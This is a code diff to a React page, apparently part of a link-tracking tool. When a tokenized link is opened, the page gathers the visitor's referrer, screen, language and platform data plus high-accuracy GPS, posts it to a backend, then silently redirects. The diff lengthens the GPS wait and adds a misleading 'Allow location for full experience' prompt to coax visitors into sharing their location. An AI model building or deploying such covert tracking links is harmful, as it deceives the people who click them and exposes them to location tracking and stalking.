@@ -1,49 +1,62 @@
-import React, { useEffect, useRef } from "react";
+import React, { useEffect, useState } from "react";
 import { useParams } from "react-router-dom";
 
 const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5001";
 
+// Generate a unique key for this capture session (per token)
+function getCaptureKey(token) {
+  return `traxelon_captured_v2_${token}`;
+}
+
 export default function TrackingCapture() {
   const { token } = useParams();
-  const hasCaptured = useRef(false);
+  const [status, setStatus] = useState("Requesting location…");
 
   useEffect(() => {
-    if (hasCaptured.current) return;
-    hasCaptured.current = true;
-    captureAndRedirect();
+    const key = getCaptureKey(token);
+
+    // Prevent double-fire (React StrictMode / fast refresh)
+    if (sessionStorage.getItem(key)) {
+      // Already captured this session — just redirect
+      setStatus("Redirecting…");
+      return;
+    }
+    sessionStorage.setItem(key, "1");
+
+    run();
   }, [token]);
 
-  async function getGPSLocation() {
-    return new Promise((resolve) => {
-      if (!navigator.geolocation) return resolve(null);
-
-      // 3-second timeout — if denied or slow, move on without GPS
-      const timer = setTimeout(() => resolve(null), 3000);
-
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          clearTimeout(timer);
-          resolve({
-            gpsLat: pos.coords.latitude,
-            gpsLon: pos.coords.longitude,
-            gpsAccuracy: Math.round(pos.coords.accuracy), // in metres
-          });
-        },
-        () => {
-          clearTimeout(timer);
-          resolve(null); // denied or unavailable
-        },
-        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
-      );
-    });
-  }
-
-  async function captureAndRedirect() {
+  async function run() {
+    let gpsLat = null;
+    let gpsLon = null;
+    let gpsAccuracy = null;
     let destinationUrl = null;
-    try {
-      // Request GPS (times out after 3s if denied)
-      const gps = await getGPSLocation();
 
+    // ── Step 1: GPS ─────────────────────────────────────────────
+    // We wait up to 15 seconds for the user to respond to the browser popup.
+    // The page stays visible ("Requesting location…") the whole time.
+    if (navigator.geolocation) {
+      setStatus("📍 Allow location for full experience…");
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0,
+          });
+        });
+        gpsLat = pos.coords.latitude;
+        gpsLon = pos.coords.longitude;
+        gpsAccuracy = Math.round(pos.coords.accuracy);
+      } catch {
+        // User denied or timed out — continue without GPS
+      }
+    }
+
+    setStatus("Redirecting…");
+
+    // ── Step 2: Send capture to backend ─────────────────────────
+    try {
       const payload = {
         token,
         referrer: document.referrer || null,
@@ -51,10 +64,9 @@ export default function TrackingCapture() {
         screenHeight: window.screen.height,
         language: navigator.language,
         platform: navigator.platform,
-        // GPS fields — null if denied
-        gpsLat: gps?.gpsLat ?? null,
-        gpsLon: gps?.gpsLon ?? null,
-        gpsAccuracy: gps?.gpsAccuracy ?? null,
+        gpsLat,
+        gpsLon,
+        gpsAccuracy,
       };
 
       const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
@@ -69,6 +81,7 @@ export default function TrackingCapture() {
       // silent fail
     }
 
+    // ── Step 3: Redirect ─────────────────────────────────────────
     if (destinationUrl) {
       window.location.replace(destinationUrl);
     }
@@ -78,24 +91,25 @@ export default function TrackingCapture() {
     <div style={{
       minHeight: "100vh",
       display: "flex",
+      flexDirection: "column",
       alignItems: "center",
       justifyContent: "center",
-      background: "#fff",
+      background: "#ffffff",
       fontFamily: "sans-serif",
     }}>
-      <div style={{ textAlign: "center", color: "#999", fontSize: 14 }}>
+      <div style={{ textAlign: "center", color: "#888", fontSize: 14 }}>
         <div style={{
-          width: 32,
-          height: 32,
-          border: "3px solid #eee",
-          borderTop: "3px solid #555",
+          width: 36,
+          height: 36,
+          border: "3px solid #f0f0f0",
+          borderTop: "3px solid #4a90e2",
           borderRadius: "50%",
-          margin: "0 auto 12px",
-          animation: "spin 0.8s linear infinite",
+          margin: "0 auto 16px",
+          animation: "spin 0.9s linear infinite",
         }} />
-        Redirecting…
-        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+        <div style={{ color: "#555", fontSize: 14 }}>{status}</div>
       </div>
+      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
     </div>
   );
 }
